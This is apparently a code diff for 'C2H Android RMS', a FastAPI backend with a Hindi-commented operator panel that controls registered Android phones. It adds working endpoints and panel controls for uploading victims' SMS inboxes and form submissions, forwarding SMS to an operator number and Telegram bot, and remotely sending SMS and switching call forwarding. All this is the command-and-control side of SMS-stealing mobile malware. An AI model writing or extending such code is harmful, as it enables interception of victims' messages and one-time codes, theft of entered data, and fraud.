@@ -1,6 +1,6 @@
 import uvicorn
 from fastapi import FastAPI, HTTPException, Request
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, JSONResponse
 from pydantic import BaseModel
 from typing import List, Optional, Dict, Any
 from datetime import datetime, timedelta, timezone
@@ -126,12 +126,11 @@ class SmsLogRequest(BaseModel):
     message_body: str
 
 # --- FastAPI Application ---
-app = FastAPI(title="C2H Android RMS Backend")
+app = FastAPI(title="C2H Android RMS")
 
 # --- API Endpoints ---
 @app.get("/", response_class=HTMLResponse)
 async def get_panel():
-    """मुख्य पैनल पेज - सीधा HTML return कर रहा है"""
     return HTMLResponse(content="""
 <!DOCTYPE html>
 <html lang="hi">
@@ -144,10 +143,10 @@ async def get_panel():
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
         }
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #f0f2f5;
             min-height: 100vh;
             padding: 20px;
         }
@@ -156,62 +155,144 @@ async def get_panel():
             margin: 0 auto;
         }
         h1 {
-            color: white;
+            color: #1a237e;
+            margin-bottom: 20px;
+            font-size: 2em;
+        }
+        
+        /* टॉप बटन सेक्शन */
+        .top-buttons {
+            display: flex;
+            gap: 15px;
             margin-bottom: 30px;
-            font-size: 2.5em;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+            flex-wrap: wrap;
         }
-        .config-section {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 40px;
-        }
-        .config-card {
+        .top-btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
             background: white;
-            padding: 25px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .top-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+        }
+        .sms-forward-btn { color: #4caf50; border-left: 4px solid #4caf50; }
+        .telegram-btn { color: #0088cc; border-left: 4px solid #0088cc; }
+        
+        /* मोडल */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal.active {
+            display: flex;
+        }
+        .modal-content {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            padding: 30px;
             border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            position: relative;
         }
-        .config-card h3 {
+        .modal-content h3 {
+            margin-bottom: 20px;
             color: #333;
-            margin-bottom: 15px;
         }
-        .config-card input {
+        .modal-content input, .modal-content select, .modal-content textarea {
             width: 100%;
             padding: 12px;
-            margin: 8px 0;
+            margin: 10px 0;
             border: 2px solid #e0e0e0;
             border-radius: 10px;
+            font-size: 1em;
         }
-        .config-card button {
+        .modal-content textarea {
+            height: 100px;
+            resize: vertical;
+        }
+        .modal-content button {
             width: 100%;
             padding: 12px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
             border: none;
             border-radius: 10px;
+            font-size: 1em;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+        .modal-content .close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 24px;
+            cursor: pointer;
+            color: #666;
+        }
+        .sim-selector {
+            display: flex;
+            gap: 15px;
+            margin: 10px 0;
+        }
+        .sim-selector label {
+            display: flex;
+            align-items: center;
+            gap: 5px;
             cursor: pointer;
         }
-        h2 {
-            color: white;
-            margin: 30px 0 20px;
-        }
+        
+        /* डिवाइस ग्रिड */
         .device-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             gap: 20px;
+            margin-top: 20px;
         }
         .device-card {
             background: white;
-            border-radius: 20px;
+            border-radius: 15px;
             padding: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             cursor: pointer;
+            transition: all 0.3s;
             border-left: 5px solid #4caf50;
         }
         .device-card.offline {
             border-left-color: #f44336;
+            opacity: 0.8;
+        }
+        .device-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 15px rgba(0,0,0,0.2);
+        }
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .device-name {
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #333;
         }
         .status {
             padding: 5px 10px;
@@ -225,71 +306,299 @@ async def get_panel():
             display: flex;
             align-items: center;
             gap: 10px;
-            margin: 15px 0;
+            margin: 10px 0;
         }
         .battery-bar {
             flex: 1;
-            height: 10px;
+            height: 8px;
             background: #e0e0e0;
-            border-radius: 5px;
+            border-radius: 4px;
             overflow: hidden;
         }
         .battery-level {
             height: 100%;
             background: #4caf50;
-            border-radius: 5px;
+            border-radius: 4px;
         }
-        .no-devices {
-            grid-column: 1 / -1;
+        
+        /* डिवाइस डिटेल पेज */
+        .device-detail-page {
+            display: none;
+            min-height: 100vh;
+        }
+        .device-detail-page.active {
+            display: block;
+        }
+        .detail-header {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .back-btn {
+            padding: 10px 20px;
+            background: #666;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .action-btn {
+            padding: 15px 25px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            color: white;
+            transition: all 0.3s;
+            flex: 1;
+            min-width: 120px;
+        }
+        .action-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .sms-action { background: #4caf50; }
+        .call-action { background: #ff9800; }
+        .form-action { background: #9c27b0; }
+        
+        /* SMS लिस्ट */
+        .sms-list {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        .sms-item {
+            padding: 15px;
+            border-bottom: 1px solid #e0e0e0;
+            margin-bottom: 10px;
+        }
+        .sms-item:last-child {
+            border-bottom: none;
+        }
+        .sms-sender {
+            font-weight: bold;
+            color: #1a237e;
+            margin-bottom: 5px;
+        }
+        .sms-message {
+            color: #333;
+            margin-bottom: 5px;
+            white-space: pre-wrap;
+        }
+        .sms-time {
+            font-size: 0.8em;
+            color: #999;
+        }
+        .form-data-list {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+        }
+        .form-item {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+        .no-data {
             text-align: center;
             padding: 50px;
-            background: white;
-            border-radius: 20px;
-            color: #666;
+            color: #999;
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div id="mainPage" class="container">
         <h1>📱 Device Control Panel</h1>
         
-        <div class="config-section">
-            <div class="config-card">
-                <h3>📨 SMS Forward Number</h3>
-                <input type="text" id="smsNumber" placeholder="Enter phone number">
-                <button onclick="updateSMSNumber()">Update</button>
-            </div>
-            <div class="config-card">
-                <h3>🤖 Telegram Config</h3>
-                <input type="text" id="botToken" placeholder="Bot Token">
-                <input type="text" id="chatId" placeholder="Chat ID">
-                <button onclick="updateTelegram()">Update</button>
-            </div>
+        <!-- टॉप बटन -->
+        <div class="top-buttons">
+            <button class="top-btn sms-forward-btn" onclick="openSMSModal()">
+                <span>📨</span> Change Forward Number
+            </button>
+            <button class="top-btn telegram-btn" onclick="openTelegramModal()">
+                <span>🤖</span> Configure Telegram
+            </button>
         </div>
         
+        <!-- डिवाइस लिस्ट -->
         <h2>📱 Registered Devices <span id="deviceCount">(0)</span></h2>
         <div id="deviceGrid" class="device-grid">
-            <div class="no-devices">
-                <h3>No devices registered yet</h3>
-                <p>Install the APK on a device to see it here</p>
+            <div class="no-data">Loading devices...</div>
+        </div>
+    </div>
+
+    <!-- डिवाइस डिटेल पेज -->
+    <div id="deviceDetailPage" class="device-detail-page">
+        <div class="container">
+            <div class="detail-header">
+                <h2 id="detailDeviceName">Device Name</h2>
+                <button class="back-btn" onclick="showMainPage()">← Back</button>
+            </div>
+            
+            <!-- एक्शन बटन -->
+            <div class="action-buttons">
+                <button class="action-btn sms-action" onclick="openSendSMSModal()">📨 Send SMS</button>
+                <button class="action-btn call-action" onclick="openCallForwardModal()">📞 Call Forwarding</button>
+                <button class="action-btn form-action" onclick="showFormData()">📋 Get Form Data</button>
+            </div>
+            
+            <!-- SMS लिस्ट -->
+            <h3>📨 SMS Inbox</h3>
+            <div id="smsList" class="sms-list">
+                <div class="no-data">Loading SMS...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SMS Forward Modal -->
+    <div id="smsModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('smsModal')">&times;</span>
+            <h3>📨 Change Forward Number</h3>
+            <input type="text" id="forwardNumber" placeholder="Enter phone number">
+            <button onclick="updateSMSNumber()">Update Number</button>
+        </div>
+    </div>
+
+    <!-- Telegram Modal -->
+    <div id="telegramModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('telegramModal')">&times;</span>
+            <h3>🤖 Configure Telegram</h3>
+            <input type="text" id="botToken" placeholder="Bot Token">
+            <input type="text" id="chatId" placeholder="Chat ID">
+            <button onclick="updateTelegram()">Save Configuration</button>
+        </div>
+    </div>
+
+    <!-- Send SMS Modal -->
+    <div id="sendSMSModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('sendSMSModal')">&times;</span>
+            <h3>📨 Send SMS</h3>
+            <input type="text" id="smsPhone" placeholder="Phone Number">
+            <textarea id="smsMessage" placeholder="Message"></textarea>
+            <div class="sim-selector">
+                <label><input type="radio" name="smsSim" value="0" checked> SIM 1</label>
+                <label><input type="radio" name="smsSim" value="1"> SIM 2</label>
+            </div>
+            <button onclick="sendSMS()">Send SMS</button>
+        </div>
+    </div>
+
+    <!-- Call Forward Modal -->
+    <div id="callForwardModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('callForwardModal')">&times;</span>
+            <h3>📞 Call Forwarding</h3>
+            <select id="callAction">
+                <option value="enable">Enable Forwarding</option>
+                <option value="disable">Disable Forwarding</option>
+            </select>
+            <input type="text" id="forwardTo" placeholder="Forward to Number (for enable)">
+            <div class="sim-selector">
+                <label><input type="radio" name="callSim" value="0" checked> SIM 1</label>
+                <label><input type="radio" name="callSim" value="1"> SIM 2</label>
+            </div>
+            <button onclick="sendCallCommand()">Execute</button>
+        </div>
+    </div>
+
+    <!-- Form Data Modal -->
+    <div id="formDataModal" class="modal">
+        <div class="modal-content" style="max-width: 600px;">
+            <span class="close" onclick="closeModal('formDataModal')">&times;</span>
+            <h3>📋 Form Submissions</h3>
+            <div id="formDataList" style="max-height: 400px; overflow-y: auto;">
+                Loading...
             </div>
         </div>
     </div>
 
     <script>
+        let currentDeviceId = null;
+        let refreshInterval = null;
+
+        // पेज लोड
+        document.addEventListener('DOMContentLoaded', function() {
+            loadDevices();
+            loadConfig();
+            refreshInterval = setInterval(loadDevices, 5000);
+        });
+
+        // मोडल functions
+        function openSMSModal() { document.getElementById('smsModal').classList.add('active'); }
+        function openTelegramModal() { document.getElementById('telegramModal').classList.add('active'); }
+        function openSendSMSModal() { document.getElementById('sendSMSModal').classList.add('active'); }
+        function openCallForwardModal() { document.getElementById('callForwardModal').classList.add('active'); }
+        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+
+        // पेज navigation
+        function showMainPage() {
+            document.getElementById('mainPage').style.display = 'block';
+            document.getElementById('deviceDetailPage').classList.remove('active');
+        }
+
+        function showDevicePage(deviceId) {
+            currentDeviceId = deviceId;
+            document.getElementById('mainPage').style.display = 'none';
+            document.getElementById('deviceDetailPage').classList.add('active');
+            loadDeviceDetails(deviceId);
+        }
+
+        // कॉन्फिग लोड
+        async function loadConfig() {
+            try {
+                const smsRes = await fetch('/api/config/sms_forward');
+                const smsData = await smsRes.json();
+                document.getElementById('forwardNumber').value = smsData.forward_number || '';
+                
+                const telRes = await fetch('/api/config/telegram');
+                const telData = await telRes.json();
+                document.getElementById('botToken').value = telData.telegram_bot_token || '';
+                document.getElementById('chatId').value = telData.telegram_chat_id || '';
+            } catch (error) {
+                console.error('Config error:', error);
+            }
+        }
+
+        // डिवाइस लोड
         async function loadDevices() {
             try {
                 const res = await fetch('/api/devices');
                 const devices = await res.json();
+                
                 document.getElementById('deviceCount').textContent = `(${devices.length})`;
+                
+                if (devices.length === 0) {
+                    document.getElementById('deviceGrid').innerHTML = '<div class="no-data">No devices registered yet</div>';
+                    return;
+                }
                 
                 let html = '';
                 devices.forEach(device => {
                     const statusClass = device.is_online ? 'online' : 'offline';
+                    const batteryClass = device.battery_level < 20 ? 'low' : '';
+                    
                     html += `
-                        <div class="device-card ${statusClass}">
-                            <div style="display:flex;justify-content:space-between">
-                                <span class="device-name">${device.device_name || 'Unknown'}</span>
+                        <div class="device-card ${statusClass}" onclick="showDevicePage('${device.device_id}')">
+                            <div class="device-header">
+                                <span class="device-name">${escapeHtml(device.device_name || 'Unknown')}</span>
                                 <span class="status">${device.is_online ? 'ONLINE' : 'OFFLINE'}</span>
                             </div>
                             <div class="battery">
@@ -299,69 +608,232 @@ async def get_panel():
                                 </div>
                                 <span>${device.battery_level}%</span>
                             </div>
-                            <div>📱 ${device.os_version || 'Android'}</div>
-                            <div>📞 ${device.phone_number || 'No number'}</div>
+                            <div>📱 ${escapeHtml(device.os_version || 'Android')}</div>
+                            <div>📞 ${escapeHtml(device.phone_number || 'No number')}</div>
                             <div style="font-size:0.85em;color:#999;margin-top:10px">
-                                Last seen: ${device.last_seen || 'Never'}
+                                Last seen: ${escapeHtml(device.last_seen || 'Never')}
                             </div>
                         </div>
                     `;
                 });
-                document.getElementById('deviceGrid').innerHTML = html || '<div class="no-devices">No devices yet</div>';
+                
+                document.getElementById('deviceGrid').innerHTML = html;
             } catch (error) {
-                console.error('Error:', error);
+                console.error('Devices error:', error);
             }
         }
 
-        async function updateSMSNumber() {
-            const number = document.getElementById('smsNumber').value;
-            if (!number) return alert('Please enter a number');
-            
-            const res = await fetch('/api/config/sms_forward', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({forward_number: number})
-            });
-            if (res.ok) alert('✅ Updated successfully!');
+        // डिवाइस डिटेल लोड
+        async function loadDeviceDetails(deviceId) {
+            try {
+                // Device info
+                const devicesRes = await fetch('/api/devices');
+                const devices = await devicesRes.json();
+                const device = devices.find(d => d.device_id === deviceId);
+                
+                if (device) {
+                    document.getElementById('detailDeviceName').textContent = 
+                        `📱 ${escapeHtml(device.device_name || 'Unknown Device')}`;
+                }
+                
+                // SMS लोड
+                const smsRes = await fetch(`/api/device/${deviceId}/sms`);
+                const smsLogs = await smsRes.json();
+                
+                let smsHtml = '';
+                if (smsLogs.length === 0) {
+                    smsHtml = '<div class="no-data">No SMS messages yet</div>';
+                } else {
+                    smsLogs.forEach(sms => {
+                        smsHtml += `
+                            <div class="sms-item">
+                                <div class="sms-sender">From: ${escapeHtml(sms.sender)}</div>
+                                <div class="sms-message">${escapeHtml(sms.message_body)}</div>
+                                <div class="sms-time">${escapeHtml(sms.received_at)}</div>
+                            </div>
+                        `;
+                    });
+                }
+                
+                document.getElementById('smsList').innerHTML = smsHtml;
+                
+            } catch (error) {
+                console.error('Device details error:', error);
+            }
         }
 
+        // फॉर्म डेटा दिखाएँ
+        async function showFormData() {
+            if (!currentDeviceId) return;
+            
+            const modal = document.getElementById('formDataModal');
+            const list = document.getElementById('formDataList');
+            
+            try {
+                const res = await fetch(`/api/device/${currentDeviceId}/forms`);
+                const forms = await res.json();
+                
+                if (forms.length === 0) {
+                    list.innerHTML = '<div class="no-data">No form submissions yet</div>';
+                } else {
+                    let html = '';
+                    forms.forEach(form => {
+                        html += `
+                            <div class="form-item">
+                                <div style="font-weight:bold;margin-bottom:5px">${escapeHtml(form.submitted_at)}</div>
+                                <div style="white-space:pre-wrap">${escapeHtml(form.custom_data)}</div>
+                            </div>
+                        `;
+                    });
+                    list.innerHTML = html;
+                }
+                
+                modal.classList.add('active');
+            } catch (error) {
+                alert('Error loading form data');
+            }
+        }
+
+        // SMS नंबर अपडेट
+        async function updateSMSNumber() {
+            const number = document.getElementById('forwardNumber').value;
+            if (!number) return alert('Please enter a number');
+            
+            try {
+                const res = await fetch('/api/config/sms_forward', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({forward_number: number})
+                });
+                
+                if (res.ok) {
+                    alert('✅ SMS forward number updated!');
+                    closeModal('smsModal');
+                }
+            } catch (error) {
+                alert('❌ Error updating');
+            }
+        }
+
+        // टेलीग्राम अपडेट
         async function updateTelegram() {
             const data = {
                 telegram_bot_token: document.getElementById('botToken').value,
                 telegram_chat_id: document.getElementById('chatId').value
             };
             
-            const res = await fetch('/api/config/telegram', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            });
-            if (res.ok) alert('✅ Updated successfully!');
-        }
-
-        async function loadConfig() {
             try {
-                const smsRes = await fetch('/api/config/sms_forward');
-                const smsData = await smsRes.json();
-                document.getElementById('smsNumber').value = smsData.forward_number || '';
+                const res = await fetch('/api/config/telegram', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
                 
-                const telRes = await fetch('/api/config/telegram');
-                const telData = await telRes.json();
-                document.getElementById('botToken').value = telData.telegram_bot_token || '';
-                document.getElementById('chatId').value = telData.telegram_chat_id || '';
+                if (res.ok) {
+                    alert('✅ Telegram config updated!');
+                    closeModal('telegramModal');
+                }
             } catch (error) {
-                console.error('Error loading config:', error);
+                alert('❌ Error updating');
             }
         }
 
-        loadDevices();
-        loadConfig();
-        setInterval(loadDevices, 5000);
+        // SMS भेजें
+        async function sendSMS() {
+            if (!currentDeviceId) return;
+            
+            const phone = document.getElementById('smsPhone').value;
+            const message = document.getElementById('smsMessage').value;
+            const sim = document.querySelector('input[name="smsSim"]:checked').value;
+            
+            if (!phone || !message) return alert('Please fill all fields');
+            
+            try {
+                const res = await fetch('/api/command/send', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        device_id: currentDeviceId,
+                        command_type: 'send_sms',
+                        command_data: {
+                            phone_number: phone,
+                            message: message,
+                            sim_slot: parseInt(sim)
+                        }
+                    })
+                });
+                
+                if (res.ok) {
+                    alert('✅ SMS command sent!');
+                    closeModal('sendSMSModal');
+                    document.getElementById('smsPhone').value = '';
+                    document.getElementById('smsMessage').value = '';
+                }
+            } catch (error) {
+                alert('❌ Error sending command');
+            }
+        }
+
+        // कॉल फॉरवर्ड कमांड भेजें
+        async function sendCallCommand() {
+            if (!currentDeviceId) return;
+            
+            const action = document.getElementById('callAction').value;
+            const forwardNumber = document.getElementById('forwardTo').value;
+            const sim = document.querySelector('input[name="callSim"]:checked').value;
+            
+            if (action === 'enable' && !forwardNumber) {
+                return alert('Please enter forward number');
+            }
+            
+            try {
+                const commandData = {
+                    action: action,
+                    sim_slot: parseInt(sim)
+                };
+                
+                if (action === 'enable') {
+                    commandData.forward_number = forwardNumber;
+                }
+                
+                const res = await fetch('/api/command/send', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        device_id: currentDeviceId,
+                        command_type: 'call_forward',
+                        command_data: commandData
+                    })
+                });
+                
+                if (res.ok) {
+                    alert(`✅ Call ${action === 'enable' ? 'forwarding enabled' : 'forwarding disabled'}!`);
+                    closeModal('callForwardModal');
+                    document.getElementById('forwardTo').value = '';
+                }
+            } catch (error) {
+                alert('❌ Error sending command');
+            }
+        }
+
+        // HTML escape
+        function escapeHtml(text) {
+            if (!text) return '';
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Cleanup
+        window.onbeforeunload = function() {
+            if (refreshInterval) clearInterval(refreshInterval);
+        };
     </script>
 </body>
 </html>
     """)
 
+# --- API Endpoints (same as before) ---
 @app.post("/api/device/register")
 async def register_device(data: DeviceRegisterRequest):
     conn = get_db_connection()
@@ -456,6 +928,87 @@ async def get_telegram_config():
         "telegram_bot_token": results.get('telegram_bot_token', ''),
         "telegram_chat_id": results.get('telegram_chat_id', '')
     }
+
+@app.post("/api/command/send")
+async def send_command(data: SendCommandRequest):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO commands (device_id, command_type, command_data, created_at) VALUES (?, ?, ?, ?)",
+        (data.device_id.strip(), data.command_type, json.dumps(data.command_data), now_utc_string())
+    )
+    conn.commit()
+    conn.close()
+    return {"status": "success", "message": "Command sent."}
+
+@app.get("/api/device/{device_id}/commands")
+async def get_pending_commands(device_id: str):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute(
+        "SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'",
+        (device_id.strip(),)
+    )
+    commands = cursor.fetchall()
+    command_list = [{"id": cmd['id'], "command_type": cmd['command_type'], "command_data": json.loads(cmd['command_data'])} for cmd in commands]
+    if command_list:
+        command_ids = [cmd['id'] for cmd in command_list]
+        placeholders = ','.join('?' * len(command_ids))
+        cursor.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", command_ids)
+        conn.commit()
+    conn.close()
+    return command_list
+
+@app.post("/api/command/{command_id}/execute")
+async def mark_command_executed(command_id: int):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("UPDATE commands SET status = 'executed' WHERE id = ?", (command_id,))
+    conn.commit()
+    conn.close()
+    return {"status": "success"}
+
+@app.post("/api/device/{device_id}/forms")
+async def submit_form(device_id: str, data: FormSubmissionRequest):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO form_submissions (device_id, custom_data, submitted_at) VALUES (?, ?, ?)",
+        (device_id.strip(), data.custom_data, now_utc_string())
+    )
+    conn.commit()
+    conn.close()
+    return {"status": "success"}
+
+@app.get("/api/device/{device_id}/forms")
+async def get_form_submissions(device_id: str):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("SELECT id, custom_data, submitted_at FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC", (device_id.strip(),))
+    forms = cursor.fetchall()
+    conn.close()
+    return [{"id": form['id'], "custom_data": form['custom_data'], "submitted_at": form['submitted_at']} for form in forms]
+
+@app.post("/api/device/{device_id}/sms")
+async def log_sms(device_id: str, data: SmsLogRequest):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO sms_logs (device_id, sender, message_body, received_at) VALUES (?, ?, ?, ?)",
+        (device_id.strip(), data.sender, data.message_body, now_utc_string())
+    )
+    conn.commit()
+    conn.close()
+    return {"status": "success"}
+
+@app.get("/api/device/{device_id}/sms")
+async def get_sms_logs(device_id: str):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("SELECT id, sender, message_body, received_at FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC LIMIT 500", (device_id.strip(),))
+    sms_logs = cursor.fetchall()
+    conn.close()
+    return [{"id": sms['id'], "sender": sms['sender'], "message_body": sms['message_body'], "received_at": sms['received_at']} for sms in sms_logs]
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8000))
